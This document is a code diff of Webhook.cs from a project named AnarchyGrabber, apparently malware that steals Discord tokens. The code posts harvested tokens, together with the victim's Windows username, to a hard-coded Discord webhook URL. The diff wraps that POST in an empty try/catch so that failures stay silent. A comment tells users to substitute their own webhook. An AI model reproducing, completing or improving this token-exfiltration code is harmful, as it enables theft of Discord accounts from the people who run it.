+++ AnarchyGrabber/Webhook.cs
@@ -7,20 +7,24 @@ namespace AnarchyGrabber
     public static class Webhook
     {
         //you've got to change this to your own discord webhook url
-        private static string _hookUrl = "https://discordapp.com/api/webhooks/612234114271150083/aHR2Owsu90Ugkq6l7Tw7HcyhPJcPCzeHhsEBc3SuVGKcGqTMxGBJZAFQSL57TPPiqZA0";
+        private static readonly string _hookUrl = "https://discordapp.com/api/webhooks/612234114271150083/aHR2Owsu90Ugkq6l7Tw7HcyhPJcPCzeHhsEBc3SuVGKcGqTMxGBJZAFQSL57TPPiqZA0";
 
 
         public static void ReportTokens(List<string> tokenReport)
         {
-            HttpClient client = new HttpClient();
-            Dictionary<string, string> contents = new Dictionary<string, string>
+            try
             {
-                { "content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", tokenReport)}" },
-                { "username", "Anarchy Token Grabber" },
-                { "avatar_url", "https://media.discordapp.net/attachments/601457544380022790/609824918028419082/Anarchy.png" }
-            };
+                HttpClient client = new HttpClient();
+                Dictionary<string, string> contents = new Dictionary<string, string>
+                    {
+                        { "content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", tokenReport)}" },
+                        { "username", "Anarchy Token Grabber" },
+                        { "avatar_url", "https://media.discordapp.net/attachments/601457544380022790/609824918028419082/Anarchy.png" }
+                    };
 
-            client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
+                client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
+            }
+            catch { }
         }
     }
 }